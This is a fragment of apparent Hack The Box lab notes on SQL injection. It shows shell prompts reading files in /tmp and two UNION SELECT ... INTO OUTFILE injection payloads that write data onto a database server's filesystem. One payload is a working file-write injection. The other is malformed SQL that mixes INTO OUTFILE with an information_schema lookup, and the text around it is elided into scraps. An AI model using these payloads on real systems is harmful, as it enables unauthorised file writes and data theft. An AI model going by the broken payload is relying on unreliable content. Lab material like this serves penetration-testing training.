...
```shell-session
xF1NN@htb[/htb]$ cat /tmp/credentials 
...
```shell-session
xF1NN@htb[/htb]$ cat /tmp/test.txt 
...
```shell-session
xF1NN@htb[/htb]$ ls -la /tmp/test.txt 
...
cn' UNION SELECT 1, users, 3, 4 INTO OUTFILE information_schema.global_variables where variable_name="/tmp/credentials"-- 

cn' union select 1,'file written successfully!',3,4 into outfile '/tmp/test.txt'-- -
